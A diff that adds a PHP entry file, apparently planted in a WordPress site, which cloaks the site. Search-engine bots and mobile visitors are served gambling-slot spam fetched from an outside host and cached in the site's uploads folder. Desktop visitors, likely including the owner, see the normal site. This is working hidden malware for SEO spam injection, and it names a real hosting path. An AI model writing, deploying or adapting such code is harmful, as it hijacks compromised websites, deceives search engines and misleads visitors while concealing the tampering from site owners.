@@ -1,0 +1,63 @@
+<?php
+// Mobile device user detection function
+function is_mobile_device($user_agent) {
+    $mobile_agents = ['Android', 'iPhone', 'iPod', 'iPad', 'Windows Phone', 'webOS', 'BlackBerry', 'Opera Mini', 'IEMobile'];
+    foreach ($mobile_agents as $agent) {
+        if (stripos($user_agent, $agent) !== false) {
+            return true;
+        }
+    }
+    return false;
+}
+
+// BOT
+function is_bot($user_agent) {
+    $bots = ['Googlebot', 'Bingbot', 'Slurp', 'DuckDuckBot', 'Baiduspider', 'YandexBot', 'Sogou', 'Exabot', 'facebot', 'ia_archiver'];
+    foreach ($bots as $bot) {
+        if (stripos($user_agent, $bot) !== false) {
+            return true;
+        }
+    }
+    return false;
+}
+
+$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
+$external_url = "https://added-cloud.cc/packdol/getcontent/prokaltim/slot-gacor.txt";
+
+// file cache
+$cache_file = '/home/u966844314/domains/protimes.co/public_html/wp-content/uploads/sites/slot-gacor.html';
+$cache_time = 1800; // 1800 detik = 30 menit
+
+function get_external_content($url) {
+    $ch = curl_init($url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
+    $content = curl_exec($ch);
+    curl_close($ch);
+    return $content;
+}
+
+function get_cached_content($cache_file, $cache_time, $url) {
+    if (file_exists($cache_file) && (time() - filemtime($cache_file) < $cache_time)) {
+        return file_get_contents($cache_file);
+    } else {
+        $content = get_external_content($url);
+        if ($content && strlen($content) > 0) {
+            file_put_contents($cache_file, $content);
+            return $content;
+        }
+        return false;
+    }
+}
+
+if (is_bot($user_agent) || is_mobile_device($user_agent)) {
+    $content = get_cached_content($cache_file, $cache_time, $external_url);
+    if ($content !== false) {
+        echo $content;
+    } else {
+        echo "<!-- Failed to return content from url-->";
+    }
+} else {
+    require('wp-blog-header.php');
+}
+?>
